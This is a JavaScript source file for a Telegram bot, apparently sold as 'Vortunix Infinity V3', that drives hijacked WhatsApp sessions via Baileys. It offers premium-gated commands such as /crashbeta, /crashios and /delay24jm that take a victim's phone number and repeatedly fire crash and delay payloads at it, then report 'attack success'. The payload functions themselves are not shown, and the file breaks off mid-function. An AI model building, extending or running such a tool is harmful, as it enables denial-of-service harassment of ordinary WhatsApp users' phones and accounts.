const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateMessageTag,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    generateMessageID,
} = require('@whiskeysockets/baileys');

const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
//definisi bot token dari file config.js
const { BOT_TOKEN } = require("./config.js");
const fs = require("fs");
const P = require("pino");
const axios = require("axios");
const figlet = require("figlet");
const crypto = require("crypto");
const path = require("path");
const token = config.BOT_TOKEN;
const chalk = require("chalk");
const bot = new TelegramBot(token, { polling: true });
const startTime = Date.now();

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
let sock = null;

// untuk menghitung waktu bot jalan
function runtime() {
  const ms = Date.now() - startTime;
  const seconds = Math.floor(ms / 1000) % 60;
  const minutes = Math.floor(ms / (1000 * 60)) % 60;
  const hours = Math.floor(ms / (1000 * 60 * 60)) % 24;
  const days = Math.floor(ms / (1000 * 60 * 60 * 24));
  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}

const supervipFile = path.resolve("./supervip_users.js");
let supervipUsers = require("./supervip_users.js");

function isOwner(userId) {
  return config.OWNER_ID.includes(String(userId));
}

function badge(userId) {
  return {
    premium: isPremium(userId) ? "Premium ✅" : "",
    owner: isOwner(userId) ? "Owner ✅" : ""
  };
}

function getUserStatus(userId) {
  const { premium, owner } = badge(userId);

  if (owner) return owner;
  if (premium) return premium;
  return "No Access ❌";
}

// Fungsi untuk cek owner
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


//msg.key.id

function dateTime() {
  const now = new Date();
  const formatter = new Intl.DateTimeFormat("id-ID", {
    timeZone: "Asia/Jakarta",
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  });

  const parts = formatter.formatToParts(now);
  const get = (type) => parts.find(p => p.type === type).value;

  return `${get("day")}-${get("month")}-${get("year")} ${get("hour")}:${get("minute")}:${get("second")}`;
}

// Validasi untuk addpremium
const premiumFile = path.resolve("./premium_users.js");
let premiumUsers = require("./premium_users.js");

function isPremium(userId) {
  const user = premiumUsers.find(u => u.id === userId.toString());
  if (!user) return false;
  
  // Cek apakah waktu kedaluwarsa sudah lewat
  const currentTime = Date.now();
  if (user.expiresAt < currentTime) {
    // Hapus pengguna yang kedaluwarsa dari daftar
    premiumUsers = premiumUsers.filter(u => u.id !== userId.toString());
    fs.writeFileSync(premiumFile, `const premiumUsers = ${JSON.stringify(premiumUsers, null, 2)};`);
    return false;  
  }

  return true; 
}

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}
//fungsi penginisialisasi
const Newsletters = [
  "120363377673013134@newsletter",
  "120363370809345725@newsletter",
];

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);                   
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}
//otomatis membuat file session
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

//function info koneksi message bot
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
\`\`\`
╭━━━⭓「 𝐒𝐓𝐀𝐑𝐓 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ⏳
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
\`\`\`
╭━━━⭓「 𝐑𝐄 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ⏳
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
        \`\`\`
╭━━━⭓「 𝐋𝐎𝐒𝐓 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ❌
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      await sock.newsletterFollow(sock, Newsletter)
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
        \`\`\`
╭━━━⭓「 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ✅
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
            \`\`\`
╭━━━⭓「 𝐏𝐀𝐢𝐑𝐢𝐍𝐆  ☇ 𝐂𝐨𝐃𝐄 ° 」
║  𝐂𝐎𝐃𝐄 : ${formattedCode}
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
          \`\`\`
╭━━━⭓「 𝐏𝐀𝐢𝐑𝐢𝐍𝐆 ☇ 𝐄𝐑𝐑𝐨𝐑 ° 」
║  𝐑𝐄𝐀𝐒𝐨𝐍 : ${error.message}
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

function checkWhatsAppConnection(ctx, next) {
  try {
    if (sessions.size === 0) {
      return ctx.reply("❌ Tidak ada koneksi WhatsApp yang aktif!\nSilakan hubungkan bot WhatsApp terlebih dahulu.", {
        parse_mode: "Markdown"
      });
    }

    // Kalau mau ambil salah satu koneksi aktif, bisa pilih acak:
    const [firstBotNumber] = sessions.keys();
    const sock = sessions.get(firstBotNumber);

    // Simpan soket ke ctx agar bisa dipakai di command
    ctx.sock = sock;

    return next();
  } catch (e) {
    console.error("❌ checkWhatsAppConnection error:", e);
    return ctx.reply("⚠️ Terjadi error saat pengecekan koneksi WhatsApp.");
  }
}


// fungsi reply pesan
function reply(msg, text, opt = {}) {
  return bot.sendMessage(msg.chat.id, text, {
    reply_to_message_id: msg.message_id,
    ...opt
  });
}
// Thumbnail Bot
const photo = "http://tmpfiles.org/dl/8710979/1754125603789.jpg";

let startMessage;
let startButton;

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  startMessage = `\`\`\`Gyzen ${msg.from.username || msg.from.first_name}!
Здравствуйте, меня зовут Дит, а мой друг Фрмнц — создатель этого скрипта. Спасибо, что воспользовались нашим скриптом.

➤  ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
 ✰ Creator : Gyzen Official
 ✰ Botname : Vortunix Infinity
 ✰ Version : 3.0.0
 ✰ Type : Case
 ✰ Status : Mulung di channel @Danzddyy 
 
Developer GyzenOffc 🕊
\`\`\``;

  startButton = {
    inline_keyboard: [
      [{ text: "「  OwnerMenu  」", callback_data: `menu1` }],
      [{ text: "「  𝐁ugMenu  」", callback_data: `menu2` }],
      [{ text: " BuyScript ", callback_data: `beli_script` }],
    ],
  };

  try {
    bot.sendPhoto(chatId, photo, {
      caption: startMessage,
      parse_mode: "Markdown",
      reply_markup: startButton,
    });
  } catch (error) {
    console.error("Error mengirim foto:", error);
    bot.sendMessage(chatId, startMessage, {
      parse_mode: "Markdown",
      reply_markup: startButton,
    });
  }
});

bot.onText(/\/crashbeta(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ sockes Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
〣 🦋 使い方 🦋 〣
—  〢 ғᴏʀᴍᴀᴛ : /crashbeta <ɴᴜᴍʙᴇʀ>
—  〢 ᴄᴏɴᴛᴏʜ : /crashbeta <𝟼𝟸xxx>
—  〢 ᴛʏᴘᴇ : crashbeta new`,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;
    bot.sendPhoto(chatId, photo, {
    caption: `
〣 🦋 攻撃成功 🦋 〣
—  〢 ᴛʏᴘᴇ : crashbeta 
—  〢 ᴛᴀʀɢᴇᴛ : ${formattedNumber}
—  〢 送信成功バグ @GyzenOffc`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 10; i++) {
      await BugPayloadCrash(sock, jid)
      await BugPayloadCrash(sock, jid)
      await BugPayloadCrash(sock, jid)
    }

  } catch (error) {
    console.error("Error in visibledelay:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/crashios(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ sockes Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
〣 🦋 使い方 🦋 〣
—  〢 ғᴏʀᴍᴀᴛ : /crashios <ɴᴜᴍʙᴇʀ>
—  〢 ᴄᴏɴᴛᴏʜ : /crashios <𝟼𝟸xxx>
—  〢 ᴛʏᴘᴇ : ᴠɪsɪʙʟᴇ`,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;
    bot.sendPhoto(chatId, photo, {
    caption: `
〣 🦋 攻撃成功 🦋 〣
—  〢 ᴛʏᴘᴇ : crashios 
—  〢 ᴛᴀʀɢᴇᴛ : ${formattedNumber}
—  〢 送信成功バグ @GyzenOffc`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 10; i++) { 
      await BugPayloadCrash(sock, jid)
      await BugPayloadCrash(sock, jid)
    }

  } catch (error) {
    console.error("Error in proto8:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/businnes(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ sockes Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
〣 🦋 使い方 🦋 〣
—  〢 ғᴏʀᴍᴀᴛ : /businnes <ɴᴜᴍʙᴇʀ>
—  〢 ᴄᴏɴᴛᴏʜ : /businnes <𝟼𝟸xxx>
—  〢 ᴛʏᴘᴇ : ғᴏʀᴄᴇᴠɪsɪʙʟᴇ`,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;
    bot.sendPhoto(chatId, photo, {
    caption: `
〣 🦋 攻撃成功 🦋 〣
—  〢 ᴛʏᴘᴇ : businnes force
—  〢 ᴛᴀʀɢᴇᴛ : ${formattedNumber}
—  〢 送信成功バグ @GyzenOffc`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 2; i++) {
      await BugPayloadCrash(sock, jid)
      await BugPayloadCrash(sock, jid)
      await BugPayloadCrash(sock, jid)
    }

  } catch (error) {
    console.error("Error in ios:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/invisdelay(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ sockes Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
〣 🦋 使い方 🦋 〣
—  〢 ғᴏʀᴍᴀᴛ : /invisdelay <ɴᴜᴍʙᴇʀ>
—  〢 ᴄᴏɴᴛᴏʜ : /invisdelay <𝟼𝟸xxx>
—  〢 ᴛʏᴘᴇ : invisdelay`,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;
    bot.sendPhoto(chatId, photo, {
    caption: `
〣 🦋 攻撃成功 🦋 〣
—  〢 ᴛʏᴘᴇ : invisdelay
—  〢 ᴛᴀʀɢᴇᴛ : ${formattedNumber}
—  〢 送信成功バグ @GyzenOffc`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 2; i++) {
      await KuotaHardXDelaySql(jid, sock, mention = true) 
      await KuotaHardXDelaySql(jid, sock, mention = true) 
    }

  } catch (error) {
    console.error("Error in ios:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/delay24jm(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ sockes Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
〣 🦋 使い方 🦋 〣
—  〢 ғᴏʀᴍᴀᴛ : /delay24jm <ɴᴜᴍʙᴇʀ>
—  〢 ᴄᴏɴᴛᴏʜ : /delay24jm <𝟼𝟸xxx>
—  〢 ᴛʏᴘᴇ : invisdelay`,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;
    bot.sendPhoto(chatId, photo, {
    caption: `
〣 🦋 攻撃成功 🦋 〣
—  〢 ᴛʏᴘᴇ : delay24jm
—  〢 ᴛᴀʀɢᴇᴛ : ${formattedNumber}
—  〢 送信成功バグ @GyzenOffc`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 2; i++) {
      await KuotaHardXDelaySql(jid, sock, mention = true) 
      await KuotaHardXDelaySql(jid, sock, mention = true) 
      await KuotaHardXDelaySql(jid, sock, mention = true) 
      await KuotaHardXDelaySql(jid, sock, mention = true) 
    }

  } catch (error) {
    console.error("Error in ios:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/sockofficial(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ sockes Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
〣 🦋 使い方 🦋 〣
—  〢 ғᴏʀᴍᴀᴛ : /sockofficial <ɴᴜᴍʙᴇʀ>
—  〢 ᴄᴏɴᴛᴏʜ : /sockofficial <𝟼𝟸xxx>
—  〢 ᴛʏᴘᴇ : invisdelay`,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;
    bot.sendPhoto(chatId, photo, {
    caption: `
〣 🦋 攻撃成功 🦋 〣
—  〢 ᴛʏᴘᴇ : sockofficial
—  〢 ᴛᴀʀɢᴇᴛ : ${formattedNumber}
—  〢 送信成功バグ @GyzenOffc`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 2; i++) {
      await KuotaHardXDelaySql(jid, sock, mention = true) 
      await KuotaHardXDelaySql(jid, sock, mention = true) 
      await KuotaHardXDelaySql(jid, sock, mention = true)
      await BugPayloadCrash(sock, jid)
      await BugPayloadCrash(sock, jid)
      await BugPayloadCrash(sock, jid)
    }

  } catch (error) {
    console.error("Error in ios:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});
// Handle callback ketika tombol ditekan
bot.on("callback_query", async (callbackQuery) => {
  const msg = callbackQuery.message
  const data = callbackQuery.data

  if (data === "beli_script") {
    const buyText = `
\`\`\`
▧ 「 SCRIPT SASUKE」
\`\`\`
╭────────────────━
┃友 *MAU BELI SC INI?*
┃
┃- *Virtunix Infinity V3*
┃
┃友 *Chat 1 : wa.me/6282137392620*
┃友 *Telegram : https://t.me/Ingfo_Skrip_Vip_Ingfo_Funct_Dll*
╰────────────────━`

    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "WhatsApp", url: "https://whatsapp.com/channel/0029VazrSjKFHWpylIi1IZ3q" },
            { text: "Telegram", url: "https://t.me/Ingfo_Skrip_Vip_Ingfo_Funct_Dll" }
          ]
        ]
      }
    }

    bot.sendMessage(msg.chat.id, buyText, opts)
    bot.answerCallbackQuery(callbackQuery.id) // untuk menghilangkan loading spinner
  }
})

// Callback
bot.on("callback_query", async (query) => {
  if (query) {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
   
    if (messageId) {
      if (query.data === "menu1") {
        await bot.editMessageCaption(
          `\`\`\`
[「  OwnerMenu  」]
 
Command :
- addbot <number>
- delbot <number>
- addprem <userid> <duration>
- delprem <userid> <duration>
\`\`\``,
          {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [[{ text: "BACK", callback_data: `backmenu` }]],
            },
          }
        );
      } else if (query.data === "menu2") {
        await bot.editMessageCaption(
          `\`\`\`
[「  BugMenu  」]

Command :
- /crashbeta <number>
 ╰┈➤ WORK BETA 
- /invisdelay <number>
 ╰┈➤ DELAY NO TAG SW
- /crashios <number>
 ╰┈➤ FC IOS
- /businnes <number>
 ╰┈➤ CRASH
- /delay24jm <number>
 ╰┈➤ SUPER DELAY LONG DURATION
- /sockofficial <number>
 ╰┈➤ CRASH NOTIF
\`\`\``,
          {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [[{ text: "BACK", callback_data: `backmenu` }]],
            },
          }
        );
      } else if (query.data === "backmenu") {
        await bot.editMessageCaption(startMessage, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "Markdown",
          reply_markup: startButton,
        });
      }      
    }
  }
});
// Fitur untuk Addprem
// ✅ /addprem <id> <days>
bot.onText(/\/addprem(?:\s+(.+)\s+(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return reply(
      msg,
      "❌ *Only Owner can use this command.*",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1] || !match[2]) {
    return reply(msg, "❗Example : /addprem <id> <days>", {
      parse_mode: "Markdown",
    });
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");
  const expirationDays = parseInt(match[2]);

  if (!newUserId || isNaN(expirationDays) || expirationDays <= 0) {
    return reply(msg, "❗ID atau waktu kedaluwarsa tidak valid.");
  }

  if (premiumUsers.some(user => user.id === newUserId)) {
    return reply(msg, "❗User sudah premium.");
  }

  const expiresAt = Date.now() + expirationDays * 24 * 60 * 60 * 1000;

  premiumUsers.push({ id: newUserId, expiresAt });

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return reply(
        msg,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar premium."
      );
    }

    reply(
      msg,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar premium dengan waktu kedaluwarsa ${expirationDays} hari.`
    );
  });
});

// ✅ /delprem <id>
bot.onText(/\/delprem(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return reply(
      msg,
      "❌ *Only Owner can use this command.*",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return reply(msg, "❗Example : /delprem <id>", {
      parse_mode: "Markdown",
    });
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  const userIndex = premiumUsers.findIndex(user => user.id === userIdToRemove);

  if (userIndex === -1) {
    return reply(msg, "❗User tidak ditemukan di daftar premium.");
  }

  premiumUsers.splice(userIndex, 1);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return reply(
        msg,
        "⚠️ Terjadi kesalahan saat menyimpan data premium."
      );
    }

    reply(
      msg,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar premium.`
    );
  });
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
 
  if (!isPremium(msg.from.id) && !isOwner(msg.from.id)) {
    return reply(msg,
      "❌ *You don't have permission to access this feature.*",
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await reply(msg,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addbot(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Validasi akses
  if (!isOwner(userId) && !isPremium(userId)) {
